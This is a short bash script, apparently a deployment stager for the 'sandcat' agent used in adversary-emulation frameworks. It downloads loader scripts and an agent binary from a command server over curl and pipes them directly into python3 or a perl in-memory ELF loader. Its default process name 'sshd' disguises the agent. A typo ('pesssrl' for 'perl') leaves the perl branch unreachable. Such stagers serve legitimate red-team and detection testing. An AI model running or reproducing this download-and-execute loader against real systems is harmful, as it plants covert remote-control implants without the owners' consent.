#!/bin/bash

set -e

export SC_NAME=${SC_NAME:-'sshd'}
export SC_SV=${SC_SV:-'http://localhost:8888'}
export SC_GRP=${SC_GRP:-'my_group'}
declare -a binaries=("python3" "python" "pesssrl")

echo "$SC_NAME $SC_SV $SC_GRP"

# used for curl requests that require additional header values
CURL_CMD=(curl -s -X POST -H "defaultServer:$SC_SV" -H "defaultGroup:$SC_GRP")
for i in "${binaries[@]}"
do
    cmd=$(command -v $i)
    echo $i
    if [[ -x "$cmd" ]]; then
        echo "binary exists"
        if [[ "$i" == "perl" ]]; then
            echo "Perl exists, crafting Perl in-memory loader"
            (curl -s -X POST -H 'file:sandcat-elfload.pl.1' $SC_SV/file/download &&
            ${CURL_CMD[@]} -H 'file:sandcat.go' -H 'platform:linux' $SC_SV/file/download |
            perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' &&
            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_SV/file/download; ) | perl &
            break
        elif [[ "$i" == "python3" ]] || [[ "$i" == "python" ]]; then
            echo "Python/python3 exists"
            curl -s -X POST -H 'file:sandcat-elfload.py' $SC_SV/file/download | python3
            break
        fi
    else
        echo "binary doesn't exist"
    fi
done

unset SC_NAME
unset SC_SV
unset SC_GRP